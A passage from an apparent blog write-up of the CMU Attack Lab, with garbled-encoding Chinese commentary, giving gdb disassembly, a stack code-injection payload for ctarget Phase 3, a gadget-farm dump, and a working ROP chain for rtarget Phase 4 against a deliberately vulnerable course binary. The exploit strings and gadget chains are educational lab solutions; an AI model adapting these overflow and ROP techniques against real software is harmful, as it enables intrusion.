   0x000000000040190b &amp;lt;+17&amp;gt;:    mov    0x202bd3(%rip),%edi        # 0x6044e4 &amp;lt;cookie&amp;gt;
   0x0000000000401911 &amp;lt;+23&amp;gt;:    call   0x40184c &amp;lt;hexmatch&amp;gt;
   0x0000000000401916 &amp;lt;+28&amp;gt;:    test   %eax,%eax
   0x0000000000401918 &amp;lt;+30&amp;gt;:    je     0x40193d &amp;lt;touch3+67&amp;gt;
   0x000000000040191a &amp;lt;+32&amp;gt;:    mov    %rbx,%rdx
   0x000000000040191d &amp;lt;+35&amp;gt;:    mov    $0x403138,%esi
   0x0000000000401922 &amp;lt;+40&amp;gt;:    mov    $0x1,%edi
   0x0000000000401927 &amp;lt;+45&amp;gt;:    mov    $0x0,%eax
   0x000000000040192c &amp;lt;+50&amp;gt;:    call   0x400df0 &amp;lt;__printf_chk@plt&amp;gt;
   0x0000000000401931 &amp;lt;+55&amp;gt;:    mov    $0x3,%edi
   0x0000000000401936 &amp;lt;+60&amp;gt;:    call   0x401c8d &amp;lt;validate&amp;gt;
   0x000000000040193b &amp;lt;+65&amp;gt;:    jmp    0x40195e &amp;lt;touch3+100&amp;gt;
   0x000000000040193d &amp;lt;+67&amp;gt;:    mov    %rbx,%rdx
   0x0000000000401940 &amp;lt;+70&amp;gt;:    mov    $0x403160,%esi
   0x0000000000401945 &amp;lt;+75&amp;gt;:    mov    $0x1,%edi
   0x000000000040194a &amp;lt;+80&amp;gt;:    mov    $0x0,%eax
   0x000000000040194f &amp;lt;+85&amp;gt;:    call   0x400df0 &amp;lt;__printf_chk@plt&amp;gt;
   0x0000000000401954 &amp;lt;+90&amp;gt;:    mov    $0x3,%edi
   0x0000000000401959 &amp;lt;+95&amp;gt;:    call   0x401d4f &amp;lt;fail&amp;gt;
   0x000000000040195e &amp;lt;+100&amp;gt;:   mov    $0x0,%edi
   0x0000000000401963 &amp;lt;+105&amp;gt;:   call   0x400e40 &amp;lt;exit@plt&amp;gt;
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸å¦¨ä»¥æ ˆé¡¶æŒ‡é’ˆä¸ºsval,æ„é€ æ³¨å…¥ä»£ç &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Phase3:
	mov    $0x5561dc78, %rdi
	mov    $0x4018fa,%r8
	sub    $0x28,%rsp
	call   *%r8
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è·ŸPhase2çš„æ“ä½œä¸€æ ·,æŸ¥çœ‹æœºå™¨æŒ‡ä»¤:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;Phase3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &amp;lt;Phase3&amp;gt;:
   0:   48 c7 c7 78 dc 61 55    mov    $0x5561dc78,%rdi
   7:   49 c7 c0 fa 18 40 00    mov    $0x4018fa,%r8
   e:   48 83 ec 28             sub    $0x28,%rsp
  12:   41 ff d0                call   *%r8
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ„é€ æ³¨å…¥ä»£ç &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/* Phase3 */
35 39 62 39 39 37 66 61 00          /* cookie:59b997fa */
48 c7 c7 78 dc 61 55                /* mov    $0x5561dc78,%rdi */
49 c7 c0 fa 18 40 00                /* mov    $0x4018fa,%r8 */
48 83 ec 30                         /* sub    $0x30,%rsp */
41 ff d0                            /* call   *%r8 */
/* ä»¥ä¸Šå…±30å­—èŠ‚ */
ff ff ff ff ff ff ff ff ff ff 
81 dc 61 55 /* è¿”å›åœ°å€è¦†å†™ä¸º0x5561dc81  %rsp+9 */
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ•…æŠ€é‡æ–½å°±æˆåŠŸäº†!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ ./ctarget -qi Phase3-raw
Cookie: 0x59b997fa
Touch3!: You called touch3(&amp;quot;59b997fa&amp;quot;)
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:35 39 62 39 39 37 66 61 00 48 C7 C7 78 DC 61 55 49 C7 C0 FA 18 40 00 48 83 EC 30 41 FF D0 FF FF FF FF FF FF FF FF FF FF 81 DC 61 55
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™é‡Œæˆ‘è¸©äº†ä¸€ä¸ªå‘.ä¸€å¼€å§‹æˆ‘æ²¡æœ‰ &lt;code&gt;sub    $0x30,%rsp&lt;/code&gt; å¯¼è‡´cookieå­—ç¬¦ä¸²è¢«è¦†å†™äº†,å› ä¸ºæ‰§è¡Œè¿”å›åœ°å€å‰æ ˆåº•æŒ‡é’ˆå‘ä¸Šç§»åŠ¨40å­—èŠ‚,åŠ ä¸Šè¿”å›åœ°å€ä¼¼ä¹popäº†,æ‰€ä»¥æ ˆåº•æŒ‡é’ˆå…¶å®åœ¨0x5561dc78+0x28+0x8å¤„.ä¸ºäº†é¿å…è¦†å†™æˆ‘çš„cookie,åº”å…ˆå°†æ ˆåº•æŒ‡é’ˆå‡å»48å­—èŠ‚å†è°ƒç”¨ &lt;code&gt;call touch3&lt;/code&gt;.&lt;/p&gt;
&lt;h1&gt;rtaget:Return-Oriented Programming&lt;/h1&gt;
&lt;p&gt;ä¸ºäº†åº”å¯¹ä»¥ä¸Šctargetçš„æ”»å‡»æ–¹å¼,æ“ä½œç³»ç»Ÿé‡‡ç”¨äº†æ ˆéšæœºåŒ–æŠ€æœ¯å’Œå°†æ ˆå†…å­˜æ ‡è®°ä¸ºä¸å¯æ‰§è¡Œ.è™½ç„¶ä¸èƒ½è‡ªå·±æ³¨å…¥ä»£ç äº†,ä½†æ˜¯ç°æœ‰çš„ä»£ç æ˜¯å¯ä»¥æ‰§è¡Œçš„.è¿™å°±æ˜¯é¢å‘è¿”å›çš„ç¼–ç¨‹(ROP).
ROPçš„ç­–ç•¥æ˜¯åœ¨ç°æœ‰ç¨‹åºçš„å­—èŠ‚åºåˆ—ä¸­æŠ½å–æŒ‡ä»¤(ä»¥ &lt;code&gt;0xc3   /* ret */&lt;/code&gt;ç»“å°¾),è¢«ç§°ä¸ºgadget.
farm.cæ–‡ä»¶ä¸ºæˆ‘æä¾›äº†è¿™äº›å¯ç”¨çš„æŒ‡ä»¤é›†,ç§°ä¸ºgadget farm.åœ¨rtargetä¸­,gadget farmä»¥ &lt;code&gt;start_farm&lt;/code&gt;å‡½æ•°èµ·å§‹,ä»¥ &lt;code&gt;end_farm&lt;/code&gt;å‡½æ•°ç»“å°¾.æˆ‘åœ¨gdbä¸­,é¦–å…ˆåˆ†åˆ«æ‰¾åˆ°äº†è¿™ä¸¤ä¸ªå‡½æ•°æ‰€åœ¨çš„åœ°å€:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disassemble start_farm
Dump of assembler code for function start_farm:
   0x0000000000401994 &amp;lt;+0&amp;gt;:     mov    $0x1,%eax
   0x0000000000401999 &amp;lt;+5&amp;gt;:     ret
End of assembler dump.
(gdb) disass end_farm
Dump of assembler code for function end_farm:
   0x0000000000401ab2 &amp;lt;+0&amp;gt;:     mov    $0x1,%eax
   0x0000000000401ab7 &amp;lt;+5&amp;gt;:     ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç„¶åæ˜¾ç¤ºè¿™ä¸¤ä¸ªåœ°å€ä¹‹é—´å†…å­˜çš„å­—èŠ‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;(gdb) disass /r 0x401994,0x401ab7
Dump of assembler code from 0x401994 to 0x401ab7:
   0x0000000000401994 &amp;lt;start_farm+0&amp;gt;:   b8 01 00 00 00          mov    $0x1,%eax
   0x0000000000401999 &amp;lt;start_farm+5&amp;gt;:   c3                      ret
   0x000000000040199a &amp;lt;getval_142+0&amp;gt;:   b8 fb 78 90 90          mov    $0x909078fb,%eax
   0x000000000040199f &amp;lt;getval_142+5&amp;gt;:   c3                      ret
   0x00000000004019a0 &amp;lt;addval_273+0&amp;gt;:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
   0x00000000004019a6 &amp;lt;addval_273+6&amp;gt;:   c3                      ret
   0x00000000004019a7 &amp;lt;addval_219+0&amp;gt;:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
   0x00000000004019ad &amp;lt;addval_219+6&amp;gt;:   c3                      ret
   0x00000000004019ae &amp;lt;setval_237+0&amp;gt;:   c7 07 48 89 c7 c7       movl   $0xc7c78948,(%rdi)
   0x00000000004019b4 &amp;lt;setval_237+6&amp;gt;:   c3                      ret
   0x00000000004019b5 &amp;lt;setval_424+0&amp;gt;:   c7 07 54 c2 58 92       movl   $0x9258c254,(%rdi)
   0x00000000004019bb &amp;lt;setval_424+6&amp;gt;:   c3                      ret
   0x00000000004019bc &amp;lt;setval_470+0&amp;gt;:   c7 07 63 48 8d c7       movl   $0xc78d4863,(%rdi)
   0x00000000004019c2 &amp;lt;setval_470+6&amp;gt;:   c3                      ret
   0x00000000004019c3 &amp;lt;setval_426+0&amp;gt;:   c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
   0x00000000004019c9 &amp;lt;setval_426+6&amp;gt;:   c3                      ret
   0x00000000004019ca &amp;lt;getval_280+0&amp;gt;:   b8 29 58 90 c3          mov    $0xc3905829,%eax
   0x00000000004019cf &amp;lt;getval_280+5&amp;gt;:   c3                      ret
   0x00000000004019d0 &amp;lt;mid_farm+0&amp;gt;:     b8 01 00 00 00          mov    $0x1,%eax
   0x00000000004019d5 &amp;lt;mid_farm+5&amp;gt;:     c3                      ret
   0x00000000004019d6 &amp;lt;add_xy+0&amp;gt;:       48 8d 04 37             lea    (%rdi,%rsi,1),%rax
   0x00000000004019da &amp;lt;add_xy+4&amp;gt;:       c3                      ret
   0x00000000004019db &amp;lt;getval_481+0&amp;gt;:   b8 5c 89 c2 90          mov    $0x90c2895c,%eax
   0x00000000004019e0 &amp;lt;getval_481+5&amp;gt;:   c3                      ret
   0x00000000004019e1 &amp;lt;setval_296+0&amp;gt;:   c7 07 99 d1 90 90       movl   $0x9090d199,(%rdi)
   0x00000000004019e7 &amp;lt;setval_296+6&amp;gt;:   c3                      ret
   0x00000000004019e8 &amp;lt;addval_113+0&amp;gt;:   8d 87 89 ce 78 c9       lea    -0x36873177(%rdi),%eax
   0x00000000004019ee &amp;lt;addval_113+6&amp;gt;:   c3                      ret
--Type &amp;lt;RET&amp;gt; for more, q to quit, c to continue without paging--c
   0x00000000004019ef &amp;lt;addval_490+0&amp;gt;:   8d 87 8d d1 20 db       lea    -0x24df2e73(%rdi),%eax
   0x00000000004019f5 &amp;lt;addval_490+6&amp;gt;:   c3                      ret
   0x00000000004019f6 &amp;lt;getval_226+0&amp;gt;:   b8 89 d1 48 c0          mov    $0xc048d189,%eax
   0x00000000004019fb &amp;lt;getval_226+5&amp;gt;:   c3                      ret
   0x00000000004019fc &amp;lt;setval_384+0&amp;gt;:   c7 07 81 d1 84 c0       movl   $0xc084d181,(%rdi)
   0x0000000000401a02 &amp;lt;setval_384+6&amp;gt;:   c3                      ret
   0x0000000000401a03 &amp;lt;addval_190+0&amp;gt;:   8d 87 41 48 89 e0       lea    -0x1f76b7bf(%rdi),%eax
   0x0000000000401a09 &amp;lt;addval_190+6&amp;gt;:   c3                      ret
   0x0000000000401a0a &amp;lt;setval_276+0&amp;gt;:   c7 07 88 c2 08 c9       movl   $0xc908c288,(%rdi)
   0x0000000000401a10 &amp;lt;setval_276+6&amp;gt;:   c3                      ret
   0x0000000000401a11 &amp;lt;addval_436+0&amp;gt;:   8d 87 89 ce 90 90       lea    -0x6f6f3177(%rdi),%eax
   0x0000000000401a17 &amp;lt;addval_436+6&amp;gt;:   c3                      ret
   0x0000000000401a18 &amp;lt;getval_345+0&amp;gt;:   b8 48 89 e0 c1          mov    $0xc1e08948,%eax
   0x0000000000401a1d &amp;lt;getval_345+5&amp;gt;:   c3                      ret
   0x0000000000401a1e &amp;lt;addval_479+0&amp;gt;:   8d 87 89 c2 00 c9       lea    -0x36ff3d77(%rdi),%eax
   0x0000000000401a24 &amp;lt;addval_479+6&amp;gt;:   c3                      ret
   0x0000000000401a25 &amp;lt;addval_187+0&amp;gt;:   8d 87 89 ce 38 c0       lea    -0x3fc73177(%rdi),%eax
   0x0000000000401a2b &amp;lt;addval_187+6&amp;gt;:   c3                      ret
   0x0000000000401a2c &amp;lt;setval_248+0&amp;gt;:   c7 07 81 ce 08 db       movl   $0xdb08ce81,(%rdi)
   0x0000000000401a32 &amp;lt;setval_248+6&amp;gt;:   c3                      ret
   0x0000000000401a33 &amp;lt;getval_159+0&amp;gt;:   b8 89 d1 38 c9          mov    $0xc938d189,%eax
   0x0000000000401a38 &amp;lt;getval_159+5&amp;gt;:   c3                      ret
   0x0000000000401a39 &amp;lt;addval_110+0&amp;gt;:   8d 87 c8 89 e0 c3       lea    -0x3c1f7638(%rdi),%eax
   0x0000000000401a3f &amp;lt;addval_110+6&amp;gt;:   c3                      ret
   0x0000000000401a40 &amp;lt;addval_487+0&amp;gt;:   8d 87 89 c2 84 c0       lea    -0x3f7b3d77(%rdi),%eax
   0x0000000000401a46 &amp;lt;addval_487+6&amp;gt;:   c3                      ret
   0x0000000000401a47 &amp;lt;addval_201+0&amp;gt;:   8d 87 48 89 e0 c7       lea    -0x381f76b8(%rdi),%eax
   0x0000000000401a4d &amp;lt;addval_201+6&amp;gt;:   c3                      ret
   0x0000000000401a4e &amp;lt;getval_272+0&amp;gt;:   b8 99 d1 08 d2          mov    $0xd208d199,%eax
   0x0000000000401a53 &amp;lt;getval_272+5&amp;gt;:   c3                      ret
   0x0000000000401a54 &amp;lt;getval_155+0&amp;gt;:   b8 89 c2 c4 c9          mov    $0xc9c4c289,%eax
   0x0000000000401a59 &amp;lt;getval_155+5&amp;gt;:   c3                      ret
   0x0000000000401a5a &amp;lt;setval_299+0&amp;gt;:   c7 07 48 89 e0 91       movl   $0x91e08948,(%rdi)
   0x0000000000401a60 &amp;lt;setval_299+6&amp;gt;:   c3                      ret
   0x0000000000401a61 &amp;lt;addval_404+0&amp;gt;:   8d 87 89 ce 92 c3       lea    -0x3c6d3177(%rdi),%eax
   0x0000000000401a67 &amp;lt;addval_404+6&amp;gt;:   c3                      ret
   0x0000000000401a68 &amp;lt;getval_311+0&amp;gt;:   b8 89 d1 08 db          mov    $0xdb08d189,%eax
   0x0000000000401a6d &amp;lt;getval_311+5&amp;gt;:   c3                      ret
   0x0000000000401a6e &amp;lt;setval_167+0&amp;gt;:   c7 07 89 d1 91 c3       movl   $0xc391d189,(%rdi)
   0x0000000000401a74 &amp;lt;setval_167+6&amp;gt;:   c3                      ret
   0x0000000000401a75 &amp;lt;setval_328+0&amp;gt;:   c7 07 81 c2 38 d2       movl   $0xd238c281,(%rdi)
   0x0000000000401a7b &amp;lt;setval_328+6&amp;gt;:   c3                      ret
   0x0000000000401a7c &amp;lt;setval_450+0&amp;gt;:   c7 07 09 ce 08 c9       movl   $0xc908ce09,(%rdi)
   0x0000000000401a82 &amp;lt;setval_450+6&amp;gt;:   c3                      ret
   0x0000000000401a83 &amp;lt;addval_358+0&amp;gt;:   8d 87 08 89 e0 90       lea    -0x6f1f76f8(%rdi),%eax
   0x0000000000401a89 &amp;lt;addval_358+6&amp;gt;:   c3                      ret
   0x0000000000401a8a &amp;lt;addval_124+0&amp;gt;:   8d 87 89 c2 c7 3c       lea    0x3cc7c289(%rdi),%eax
   0x0000000000401a90 &amp;lt;addval_124+6&amp;gt;:   c3                      ret
   0x0000000000401a91 &amp;lt;getval_169+0&amp;gt;:   b8 88 ce 20 c0          mov    $0xc020ce88,%eax
   0x0000000000401a96 &amp;lt;getval_169+5&amp;gt;:   c3                      ret
   0x0000000000401a97 &amp;lt;setval_181+0&amp;gt;:   c7 07 48 89 e0 c2       movl   $0xc2e08948,(%rdi)
   0x0000000000401a9d &amp;lt;setval_181+6&amp;gt;:   c3                      ret
   0x0000000000401a9e &amp;lt;addval_184+0&amp;gt;:   8d 87 89 c2 60 d2       lea    -0x2d9f3d77(%rdi),%eax
   0x0000000000401aa4 &amp;lt;addval_184+6&amp;gt;:   c3                      ret
   0x0000000000401aa5 &amp;lt;getval_472+0&amp;gt;:   b8 8d ce 20 d2          mov    $0xd220ce8d,%eax
   0x0000000000401aaa &amp;lt;getval_472+5&amp;gt;:   c3                      ret
   0x0000000000401aab &amp;lt;setval_350+0&amp;gt;:   c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)
   0x0000000000401ab1 &amp;lt;setval_350+6&amp;gt;:   c3                      ret
   0x0000000000401ab2 &amp;lt;end_farm+0&amp;gt;:     b8 01 00 00 00          mov    $0x1,%eax
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ–è€…,åˆ©ç”¨æä¾›çš„farm.cæ–‡ä»¶:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gcc -c farm.c
objdump -d farm.o &amp;gt; farm.s
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¾—åˆ°çš„farm.sæ–‡ä»¶ä¸ä»¥ä¸Šgdbç»“æœç†è®ºä¸Šåº”è¯¥ç›¸åŒ,ä½†æ˜¯æˆ‘å‘ç°ä¸åŒ,farm.sæ¯ä¸ªå‡½æ•°éƒ½å¤šäº† &lt;code&gt;push&lt;/code&gt;,&lt;code&gt;pop&lt;/code&gt;è¿™äº›æ“ä½œ,è¿™æ˜¯ [[æœºå™¨çº§ç¼–ç¨‹III(è¿‡ç¨‹Procedure)#å¯„å­˜å™¨ä¿å­˜çº¦å®š|è¢«è°ƒç”¨è€…ä¿å­˜çš„çº¦å®š]] ,æˆ‘çŒœè¿™æ˜¯ç¼–è¯‘å™¨ä¼˜åŒ–è¡Œä¸ºå¹¶ä¸”è®¤ä¸ºåº”è¯¥é‡‡ç”¨gdbä¸­çš„ç»“æœ.å°†ä»¥ä¸Šgdbåæ±‡ç¼–ç»“æœä¿å­˜ä¸ºfarm.d,ç†Ÿç»ƒä½¿ç”¨vimæŸ¥æ‰¾åŠŸèƒ½æŠ½å–æŒ‡ä»¤.&lt;/p&gt;
&lt;h2&gt;Phase 4&lt;/h2&gt;
&lt;p&gt;Handoutä¸­æç¤ºæˆ‘,è¿™ä¸ªé—®é¢˜ä½¿ç”¨ä¸¤ä¸ªgadgetå’Œ &lt;code&gt;pop&lt;/code&gt; æŒ‡ä»¤,æ³¨å…¥çš„å­—ç¬¦ä¸²åŒ…æ‹¬æ•°æ®éƒ¨åˆ†.æ—¢ç„¶ä½¿ç”¨ä¸¤ä¸ªgadget,é‚£å°±éœ€è¦ç”¨åˆ° &lt;code&gt;test&lt;/code&gt;å‡½æ•°ä»¥åŠè°ƒç”¨&lt;code&gt;test&lt;/code&gt;å‡½æ•°çš„æ ˆå¸§.åœ¨gdbä¸­&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;b test
layout asm 
layout regs
r -q
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯ä»¥å‘ç° &lt;code&gt;test&lt;/code&gt;å‡½æ•°çš„æ ˆå¸§ä¸º8å­—èŠ‚,å…¶ä¸Šçš„0x402044ä¼¼ä¹ä¸ºå¦ä¸€ä¸ªå‡½æ•°çš„åœ°å€.ä¸€çœ‹æœç„¶
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250125163221.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ç»“åˆctargetä¸­å¯¹ &lt;code&gt;getbuf&lt;/code&gt;å‡½æ•°çš„è®¤è¯†,æˆ‘å¯ä»¥ç”»å‡ºè·å–è¾“å…¥æ—¶æ ˆçš„æƒ…å†µ:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;æ ˆç©ºé—´&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;(launchå‡½æ•°æ ˆå¸§)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x402044 &amp;lt;launch+112&amp;gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;(testå‡½æ•°æ ˆå¸§)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;8å­—èŠ‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x401976 &amp;lt;test+14&amp;gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;(getbuffå‡½æ•°æ ˆå¸§)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;40å­—èŠ‚buffer&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;æœ€ç›´æ¥çš„è§£æ³•æ€è·¯è‡ªç„¶å°±æ˜¯&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;æ ˆç©ºé—´&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;å¡«å……&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;(launchå‡½æ•°æ ˆå¸§)&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x4017ec&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;return address&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;(testå‡½æ•°æ ˆå¸§)&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;8å­—èŠ‚&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;cookie&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;&lt;code&gt;5f c3&lt;/code&gt;æ‰€åœ¨çš„åœ°å€&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;gadget address 1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;(getbuffå‡½æ•°æ ˆå¸§)&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;40å­—èŠ‚buffer&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;å¡«å……ä»»æ„å­—ç¬¦&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;å…¶ä¸­&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;pre&gt;&lt;code&gt;gadget 1:
	pop    %rdi
	ret

return address:
	0x4017ec &amp;lt;touch2&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;gadget address1 å¯¹åº”çš„å­—èŠ‚æŒ‡ä»¤æ˜¯&lt;code&gt;5f c3&lt;/code&gt;,ä½†æ˜¯åœ¨farm.dä¸­æ‰¾ä¸åˆ°,åªå¥½å€ŸåŠ©ä¸­é—´å˜é‡
æ³¨æ„åˆ°&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0x00000000004019a7 &amp;lt;addval_219+0&amp;gt;:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
# 58 90 c3 :	pop		%rax;ret
0x00000000004019a0 &amp;lt;addval_273+0&amp;gt;:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
# 48 89 c7 c3 :		movq	%rax,%rdi;ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ‰€ä»¥gadgetåº”è¯¥è®¾è®¡ä¸º:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gadget 1:
	pop    %rax
	ret

gedget 2:
	movq    %rax,%rdi
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç›¸åº”åœ°,æ ˆç©ºé—´åº”è¯¥è®¾è®¡ä¸º:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;æ ˆç©ºé—´&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;å¡«å……&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;(launchå‡½æ•°æ ˆå¸§)&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x4017ec&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;touch2 address&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x4019a2&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;gadget address 2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;(testå‡½æ•°æ ˆå¸§)&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;8å­—èŠ‚&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;cookie&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;0x4019ab&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;gadget address 1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;(getbuffå‡½æ•°æ ˆå¸§)&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;40å­—èŠ‚buffer&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;å¡«å……ä»»æ„å­—ç¬¦&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;æ ¹æ®ä»¥ä¸Šè®¾è®¡,å¡«å……çš„å­—ç¬¦ä¸²ä¸º&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;pre&gt;&lt;code&gt;/* Phase4 */
ff ff ff ff ff ff ff ff ff ff 
ff ff ff ff ff ff ff ff ff ff 
ff ff ff ff ff ff ff ff ff ff 
ff ff ff ff ff ff ff ff ff ff 
/* ä»¥ä¸Š40å­—èŠ‚ */
ab 19 40 00 00 00 00 00 /* gadget address 1 */
fa 97 b9 59 00 00 00 00 /* cookie: 59b997fa */
a2 19 40 00 00 00 00 00 /* gadget address 2 */
ec 17 40 00 00 00 00 00 /* touch2 address */
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆåŠŸäº†!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;$ ./rtarget -qi Phase4-raw
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ‰§è¡Œè¿”å›åœ°å€çš„æ—¶å€™æ ˆé¡¶æŒ‡é’ˆå·²ç»åœ¨è¿™å—8å­—èŠ‚åœ°å€å†…å­˜çš„ä¸Šæ–¹äº†.
é‡åˆ°&lt;code&gt;ret&lt;/code&gt;æŒ‡ä»¤æ—¶,å®è´¨æ˜¯å°†æ­¤æ—¶çš„æ ˆé¡¶æŒ‡é’ˆä¸Šæ–¹å½“ä½œè¿”å›åœ°å€å–å‡ºå¹¶è·³è½¬.&lt;/p&gt;
&lt;h2&gt;Phase 5&lt;/h2&gt;
&lt;p&gt;æ ¹æ®Handoutçš„æç¤º,å¯èƒ½éœ€è¦ç”¨åˆ°8ä¸ªgadget
æ³¨æ„åˆ°&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;	0x0000000000401a03 &amp;lt;addval_190+0&amp;gt;:   8d 87 41 48 89 e0       lea    -0x1f76b7bf(%rdi),%eax
# 48 89 e0 c3:  movq     %rsp,%rax;ret
	0x00000000004019a0 &amp;lt;addval_273+0&amp;gt;:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
# 48 89 c7 c3 :     movq    %rax,%rdi;ret
&lt;/code&gt;&lt;/pre&gt;
